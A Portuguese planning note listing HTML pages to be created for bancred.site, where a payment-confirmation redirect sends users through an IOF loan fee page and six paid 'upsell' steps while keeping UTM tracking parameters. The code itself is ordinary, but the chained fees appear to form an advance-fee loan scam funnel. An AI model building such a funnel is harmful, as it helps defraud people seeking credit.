# 📋 Páginas que Precisam ser Criadas

## ⚠️ Status Atual:

O **código de redirecionamento está funcional** e preserva os parâmetros corretamente, mas as **páginas de destino ainda não existem** e precisam ser criadas.

## 📄 Páginas que Precisam ser Criadas:

### **1. Página Principal (Payment EMP):**
- **Arquivo:** `conta/saque/iof.html`
- **Quando é usada:** Quando `servico == 'Payment EMP'` (padrão)
- **URL de destino:** `https://bancred.site/conta/saque/iof.html?utm_source=google&utm_medium=cpc` (com parâmetros reais)

### **2. Páginas de Upsell:**

#### **Upsell 01:**
- **Arquivo:** `conta/saque/tarifa-cadastro.html`
- **Quando é usada:** Quando `servico == 'Payment EMP Upsell 01'`
- **URL de destino:** `https://bancred.site/conta/saque/tarifa-cadastro.html?utm_source=google&utm_medium=cpc`

#### **Upsell 02:**
- **Arquivo:** `conta/app-download.html`
- **Quando é usada:** Quando `servico == 'Payment EMP Upsell 02'`
- **URL de destino:** `https://bancred.site/conta/app-download.html?utm_source=google&utm_medium=cpc`

#### **Upsell 03:**
- **Arquivo:** `conta/aumento-limite.html`
- **Quando é usada:** Quando `servico == 'Payment EMP Upsell 03'`
- **URL de destino:** `https://bancred.site/conta/aumento-limite.html?utm_source=google&utm_medium=cpc`

#### **Upsell 04:**
- **Arquivo:** `conta/assinatura.html`
- **Quando é usada:** Quando `servico == 'Payment EMP Upsell 04'`
- **URL de destino:** `https://bancred.site/conta/assinatura.html?utm_source=google&utm_medium=cpc`

#### **Upsell 05:**
- **Arquivo:** `conta/confirmacao-dados.html`
- **Quando é usada:** Quando `servico == 'Payment EMP Upsell 05'`
- **URL de destino:** `https://bancred.site/conta/confirmacao-dados.html?utm_source=google&utm_medium=cpc`

#### **Upsell 06:**
- **Arquivo:** `conta/pagamento-sucesso.html`
- **Quando é usada:** Quando `servico == 'Payment EMP Upsell 06'`
- **URL de destino:** `https://bancred.site/conta/pagamento-sucesso.html?utm_source=google&utm_medium=cpc`

## 📁 Estrutura de Diretórios Necessária:

```
backup/
└── conta/
    ├── saque/
    │   ├── iof.html                    ← PRECISA CRIAR
    │   └── tarifa-cadastro.html         ← PRECISA CRIAR
    ├── app-download.html                ← PRECISA CRIAR
    ├── aumento-limite.html              ← PRECISA CRIAR
    ├── assinatura.html                  ← PRECISA CRIAR
    ├── confirmacao-dados.html           ← PRECISA CRIAR
    └── pagamento-sucesso.html           ← PRECISA CRIAR
```

## ✅ O que JÁ está Funcionando:

1. **✅ Código de redirecionamento:** Funciona corretamente
2. **✅ Preservação de parâmetros:** Os parâmetros são salvos e restaurados corretamente
3. **✅ Lógica de seleção:** O sistema escolhe a página correta baseado no serviço
4. **✅ Adição de parâmetros:** Os parâmetros são adicionados automaticamente na URL

## ❌ O que FALTA:

1. **❌ Criar as páginas HTML:** As 7 páginas listadas acima precisam ser criadas
2. **❌ Conteúdo das páginas:** Cada página precisa ter seu conteúdo específico
3. **❌ Scripts de tracking:** As páginas devem incluir os scripts de tracking (utmify, etc.)

## 🔧 Como Funciona o Redirecionamento:

```javascript
// No payment.html, quando pagamento é confirmado:
if (data.success && data.data && data.data.status === 'paid') {
    // Obter tipo de serviço do sessionStorage
    const servico = produto.service || "Payment EMP";
    
    // Determinar URL baseado no serviço
    let redirectUrl;
    if (servico == 'Payment EMP') {
        redirectUrl = "https://bancred.site/conta/saque/iof.html";
    } else if (servico == 'Payment EMP Upsell 01') {
        redirectUrl = "https://bancred.site/conta/saque/tarifa-cadastro.html";
    }
    // ... outros serviços
    
    // Adicionar parâmetros de tracking restaurados
    redirectUrl = redirectUrl + getTrackingParams();
    
    // Redirecionar
    window.location.href = redirectUrl;
}
```

## 📝 Exemplo de Página Mínima (iof.html):

```html
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IOF - Empréstimo Seguro</title>
    <!-- Scripts de tracking (utmify) -->
    <script
      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
      data-utmify-prevent-xcod-sck
      data-utmify-prevent-subids
      async
      defer
    ></script>
</head>
<body>
    <h1>Página IOF</h1>
    <p>Conteúdo da página IOF aqui...</p>
    
    <!-- Os parâmetros de tracking serão preservados automaticamente -->
    <!-- Exemplo: iof.html?utm_source=google&utm_medium=cpc -->
</body>
</html>
```

## 🎯 Próximos Passos:

1. **Criar as 7 páginas HTML** listadas acima
2. **Adicionar conteúdo específico** para cada página
3. **Incluir scripts de tracking** (utmify, Google Analytics, etc.)
4. **Testar o fluxo completo** desde o checkout até a página de destino
5. **Verificar se os parâmetros estão sendo preservados** em cada página

## ⚠️ Importante:

- As páginas devem ser criadas nos diretórios corretos
- Os parâmetros de tracking serão adicionados automaticamente pelo código
- Não é necessário adicionar código especial para preservar parâmetros - isso já está implementado
- As páginas devem incluir os scripts de tracking para que os parâmetros sejam registrados

